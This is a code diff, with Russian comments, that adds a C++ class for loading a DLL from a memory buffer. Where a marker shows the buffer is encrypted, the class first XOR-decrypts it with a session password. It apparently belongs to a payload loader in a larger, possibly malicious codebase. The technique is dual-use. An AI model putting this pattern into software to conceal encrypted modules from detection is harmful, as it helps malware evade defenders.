@@ -3,6 +3,10 @@
 #include "Memory.h"
 #include "Strings.h"
 #include "DllLoader.h"
+#include "Utils.h"
+#include "Crypt.h"
+#include "Config.h"
+#include "md5.h"
 
 typedef struct
 {
@@ -419,3 +423,78 @@ bool BuildImport(PVOID ImageBase)
 
 	return true;
 };
+
+
+
+
+
+//*****************************************************************************
+//                            TDLL
+//*****************************************************************************
+
+TDLL::TDLL(const void* DllBuf)
+{
+	FHandle = NULL;
+	if (!DllBuf) return;
+
+	bool Encrypted = false;
+	LPBYTE Buf = (LPBYTE)DllBuf;
+
+	if (!IsExecutableFile((VOID*)DllBuf))
+	{
+		// Переданный буфер не является исполняемым файлом, расшифровываем его
+
+		// Проверяем маркер библиотеки. Наличие маркера в открытом виде
+		// означает, что данные длл находятся в окрытом виде
+		Encrypted = STRA::Hash((PCHAR)Buf, ENCRYPTED_DLL_MARKER_SIZE, false) != ENCRYPTED_DLL_MARKER_HASH;
+		Buf += ENCRYPTED_DLL_MARKER_SIZE;
+
+		// Получаем размер данных
+		DWORD Size = *(PDWORD)Buf;
+		Buf += sizeof(DWORD);
+
+		if (Encrypted)
+		{
+			// Расшифровываем данные
+
+			LPVOID NewBuf = MemAlloc(Size);
+			if (!NewBuf) return;
+
+			// Копируем данные
+			m_memcpy(NewBuf, Buf, Size);
+			Buf = (LPBYTE)NewBuf;
+
+			XORCrypt::Crypt(GetSessionPassword(), Buf, Size);
+		}
+	}
+
+	FHandle = MemoryLoadLibrary(Buf);
+
+	if (Encrypted)
+		MemFree(Buf);
+}
+//----------------------------------------------------------------------------
+
+
+TDLL::~TDLL()
+{
+	if (FHandle)
+		MemoryFreeLibrary(FHandle);
+}
+//----------------------------------------------------------------------------
+
+LPVOID TDLL::GetProcAddress(const char* Name)
+{
+	// Функция возвращает адрес функции библиотеки
+	if (FHandle && !STRA::IsEmpty(Name))
+		return (LPVOID)MemoryGetProcAddress(FHandle, Name);
+	else
+		return NULL;
+}
+//----------------------------------------------------------------------------
+
+bool TDLL::GetProcAddress(const char* Name, LPVOID &Addr)
+{
+	Addr = GetProcAddress(Name);
+	return Addr != NULL;
+}
